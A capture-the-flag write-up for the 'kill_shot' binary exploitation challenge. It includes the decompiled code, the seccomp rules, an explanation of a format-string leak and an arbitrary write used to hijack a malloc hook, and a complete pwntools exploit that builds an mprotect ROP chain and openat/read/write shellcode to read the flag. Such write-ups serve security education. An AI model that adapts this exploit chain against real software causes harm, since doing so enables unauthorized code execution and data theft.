# kill_shot

## Description

Let's learn some exploitation!

nc bin.q21.ctfsecurinets.com 1338

NOTE: flag is in /home/ctf/flag.txt

Authors: Aracna && KERRO

## Challenge

### Mitigations:

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

### Seccomp rules:

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
 0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010
 0006: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0010
 0007: 0x15 0x02 0x00 0x00000005  if (A == fstat) goto 0010
 0008: 0x15 0x01 0x00 0x0000000a  if (A == mprotect) goto 0010
 0009: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0011
 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0011: 0x06 0x00 0x00 0x00000000  return KILL
```

### Decompiled code:

```c
void fcn.00000c7b(void) //seccomp rules
{
    int32_t iVar1;
    int64_t iVar2;
    uint32_t var_8h;
    
    iVar2 = sym.imp.seccomp_init(0);
    if (iVar2 == 0) {
        sym.imp.puts("seccomp_init() error");
    // WARNING: Subroutine does not return
        sym.imp.exit(1);
    }
    sym.imp.seccomp_rule_add(iVar2, 0x7fff0000, 0, 0);
    sym.imp.seccomp_rule_add(iVar2, 0x7fff0000, 1, 0);
    sym.imp.seccomp_rule_add(iVar2, 0x7fff0000, 10, 0);
    sym.imp.seccomp_rule_add(iVar2, 0x7fff0000, 0x101, 0);
    sym.imp.seccomp_rule_add(iVar2, 0x7fff0000, 5, 0);
    iVar1 = sym.imp.seccomp_load(iVar2);
    if (iVar1 < 0) {
        sym.imp.seccomp_release(iVar2);
        sym.imp.puts("seccomp_load() error");
    // WARNING: Subroutine does not return
        sym.imp.exit(1);
    }
    sym.imp.seccomp_release(iVar2);
    return;
}

void fcn.00000fe3(void) // format string vulnerability, no %n
{
    int64_t iVar1;
    int64_t in_FS_OFFSET;
    char *var_48h;
    char *format;
    int64_t canary;
    
    canary = *(int64_t *)(in_FS_OFFSET + 0x28);
    sym.imp.write(1, "This is an introduction to format string vulnerability!\n", 0x38);
    sym.imp.write(1, "Format: ", 8);
    sym.imp.read(0, &format, 0x31);
    iVar1 = sym.imp.strchr(&format, 0x6e);
    if (iVar1 != 0) {
        sym.imp.write(1, "That\'s dangerous never use that format\n", 0x27);
    // WARNING: Subroutine does not return
        sym.imp.exit(1);
    }
    sym.imp.printf(&format);
    if (canary != *(int64_t *)(in_FS_OFFSET + 0x28)) {
    // WARNING: Subroutine does not return
        sym.imp.__stack_chk_fail();
    }
    return;
}

void sym.kill(void) // arbitrary write to any location, 8 bytes
{
    undefined8 uVar1;
    int64_t in_FS_OFFSET;
    undefined8 buf;
    char *str;
    int64_t canary;
    
    canary = *(int64_t *)(in_FS_OFFSET + 0x28);
    sym.imp.write(1, "Now this is an introduction to WWW (not the web) \\o/\n", 0x35);
    sym.imp.write(1, "Pointer: ", 9);
    sym.imp.read(0, &str, 0x14);
    uVar1 = sym.imp.strtoul(&str, 0, 10);
    sym.imp.write(1, "Content: ", 9);
    sym.imp.read(0, uVar1, 8);
    if (canary != *(int64_t *)(in_FS_OFFSET + 0x28)) {
    // WARNING: Subroutine does not return
        sym.imp.__stack_chk_fail();
    }
    return;
}

undefined8 fcn.00000da2(void) // read user input, convert to unsigned long int
{
    undefined8 uVar1;
    int64_t in_FS_OFFSET;
    undefined8 var_28h;
    char *str;
    int64_t canary;
    
    canary = *(int64_t *)(in_FS_OFFSET + 0x28);
    sym.imp.read(0, &str, 0xf);
    uVar1 = sym.imp.strtoul(&str, 0, 10);
    if (canary != *(int64_t *)(in_FS_OFFSET + 0x28)) {
    // WARNING: Subroutine does not return
        sym.imp.__stack_chk_fail();
    }
    return uVar1;
}

void fcn.00000e08(void) // allocate heap chunk, store pointer
{
    int64_t iVar1;
    undefined8 uVar2;
    undefined8 nbytes;
    
    nbytes._0_4_ = 0;
    while( true ) {
        if (9 < (int32_t)nbytes) {
            sym.imp.write(1, "No free slots!\n", 0xf);
            return;
        }
        if (*(int64_t *)((int64_t)(int32_t)nbytes * 8 + 0x202080) == 0) break;
        nbytes._0_4_ = (int32_t)nbytes + 1;
    }
    sym.imp.write(1, "Size: ", 6);
    iVar1 = fcn.00000da2();
    if (iVar1 == 0) {
        return;
    }
    uVar2 = sym.imp.malloc(iVar1);
    *(undefined8 *)((int64_t)(int32_t)nbytes * 8 + 0x202080) = uVar2;
    sym.imp.write(1, "Data: ", 6);
    sym.imp.read(0, *(undefined8 *)((int64_t)(int32_t)nbytes * 8 + 0x202080), iVar1);
    return;
}

void fcn.00000f11(void) // deallocate chunk
{
    uint64_t uVar1;
    uint32_t var_8h;
    
    sym.imp.write(1, "Index: ", 7);
    uVar1 = fcn.00000da2();
    if ((uVar1 == 0) || (9 < uVar1)) {
        sym.imp.write(1, "Wrong index!\n", 0xd);
    } else {
        if (*(int64_t *)(uVar1 * 8 + 0x202080) == 0) {
            sym.imp.write(1, "Already free\n", 0xd);
        } else {
            sym.imp.free(*(undefined8 *)(uVar1 * 8 + 0x202080));
            *(undefined8 *)(uVar1 * 8 + 0x202080) = 0;
        }
    }
    return;
}

undefined8 main(void)
{
    int64_t iVar1;
    int64_t in_FS_OFFSET;
    uint32_t var_24h;
    int64_t canary;
    
    iVar1 = *(int64_t *)(in_FS_OFFSET + 0x28);
    fcn.00000c1a();
    fcn.00000c7b();
    fcn.00000fe3();
    sym.kill();
    sym.imp.write(1, "Now let\'s take it\'s time for heap exploitation session.\n", 0x38);
    while (var_24h != 3) {
        fcn.00000d8f();
        var_24h = fcn.00000da2();
        if (var_24h == 1) {
            fcn.00000e08();
        } else {
            if (var_24h == 2) {
                fcn.00000f11();
            }
        }
    }
    if (iVar1 == *(int64_t *)(in_FS_OFFSET + 0x28)) {
        return 0;
    }
    // WARNING: Subroutine does not return
    sym.imp.__stack_chk_fail();
}
```

## Solution

Using the `printf` vulnerability, it is possible to leak the stored RBP and return address for `fcn.00000fe3`, as well as the return address for `main`.
This, using the offsets provided in the binaries, will give us the base addresses of the binary and libc, as well as a stack address.

The `sym.kill` function takes an address as an unsigned long integer, and allows us to write an arbitrary 8 bytes to this address.
This is not long enough for a ROP chain, and we cannot use a one gadget due to seccomp rules.
However, we can use this to overwrite the `malloc` and `free` hooks, allowing us to execute existing code when either of these functions are called.

`__malloc_hook` replaces the return value of `malloc` with that of the hook function.
However, the program relies on the return value of `malloc` to write to the heap, and may stop working as expected if replaced by some other value.
On the other hand, while `__free_hook` also replaces the return value of `free`, this value is not used by the program, therefore, we can overwrite this hook to redirect program execution.

By pointing `__free_hook` at `sym.kill`, we can write as many bytes as we want to whatever addresses we want by repeatedly calling `free` through `fcn.00000f11`.
The program does check that there is a valid pointer to free, so we have to call `fcn.00000e08` every time before we call free.
We also need to call `fcn.00000e08` once more at the start, before we write our ROP chain, due to an off-by-one bug which prevents us from freeing the first chunk.

Once we are able to write a ROP chain, we are still limited by the seccomp rules.
We are told the location of the flag, and the inclusion of the `openat` syscall allows us to read an arbitrary file.
Additionally, we can simplify our payload through the `mprotect` syscall, which has also been whitelisted.
This allows us to bypass the NX mitigation by changing the permissions of a page to RWX, allowing us to execute arbitrary shellcode.

## Exploit

```py
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host bin.q21.ctfsecurinets.com --port 1338 kill_shot
from pwn import *
import funcy
# Set up pwntools for the correct architecture
exe = context.binary = ELF('./kill_shot')
libc = ELF('./libc.so.6')
ld = ELF('./ld-2.27.so')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'bin.q21.ctfsecurinets.com'
port = int(args.PORT or 1338)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    p = process([ld.path, exe.path] + argv, *a, **kw, env={"LD_PRELOAD": libc.path})
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
    return p

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB

gdb_base = 0x7ffff7bd2000

gdbscript = '''
'''.format(**locals())


#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

def add_rop(qword, rop_offset):
    io.recvuntil('exit\n')
    io.send('1')

    io.recvuntil('Size: ')
    io.send('8')

    io.recvuntil("Data: ")
    io.send('G')

    io.recvuntil('exit\n')
    io.send('2')

    io.recvuntil('Index: ')
    io.send('1')

    io.recvuntil("Pointer: ")
    io.send(str(returnAddr + (rop_offset * 0x8)))

    io.recvuntil("Content: ")
    io.send(p64(qword))

    io.success("wrote " + hex(qword) + " to " + hex(returnAddr + (rop_offset * 0x8)))

io = start()

pause()

formatstr = "%25$p%16$p%17$p "
chunkSize = 0x400

printfPayload = flat({
    0: formatstr,
    # 16: p64(chunkSize),
    })


io.recvuntil("Format: ")
print(printfPayload)
io.sendline(printfPayload)

s = io.recvuntil("\n").decode()[:-1]
s = s.split('0x')
s[3] = s[3].split(' ')[0]

libcBase = int(s[1], 16) - 0x21b97
stackLeak = int(s[2], 16)
binBase = int(s[3], 16) - 0x11b3
ptrArr = binBase + 0x202080 + 0x8
symKill = binBase + 0x000010b4
mallocHook = libcBase + 0x3ed8e8

io.success("libc base addr: " + hex(libcBase))
io.success("rbp stack leak: " + hex(stackLeak))
io.success("bin base addr: " + hex(binBase))

returnAddr = stackLeak + 0x8
stackControl = stackLeak - 0x70

# io.info("controlling stack: " + hex(stackControl))

io.recvuntil("Pointer: ")
io.sendline(str(mallocHook))
io.recvuntil("Content: ")
io.send(p64(symKill))

io.recvuntil('exit\n')
io.send('1')

io.recvuntil('Size: ')
io.send('8')

io.recvuntil("Data: ")
io.send('G')


libc.address = libcBase
rop = ROP(libc)

writePage = binBase + (0x202100) // 4096 * 4096

rop.mprotect(writePage, 4096, 7)
rop.read(0, writePage, 0x1000)
rop.raw(writePage)
raw_rop = rop.chain()
raw_rop = list(funcy.chunks(8,raw_rop))


string_addr = writePage + 0x300

shellcode = asm(shellcraft.read(0, string_addr, 100))
shellcode += asm(shellcraft.openat(0,string_addr,0))
shellcode += asm(shellcraft.read('rax',string_addr,100))
shellcode += asm(shellcraft.write(1, string_addr, 100))

# io.interactive()

ropchain = raw_rop

rop_offset = 0
for i in ropchain:
    i = u64(i)
    add_rop(i, rop_offset)
    rop_offset += 1

io.recvuntil("exit\n")
io.sendline(b'3')
sleep(1)
io.send(shellcode)
sleep(1)
io.send('/home/ctf/flag.txt')
io.interactive()
```

## Flag

`flag{this_really_needs_a_kill_shot!_cc5dcc74acd62fa74899efaff22d8f79}`

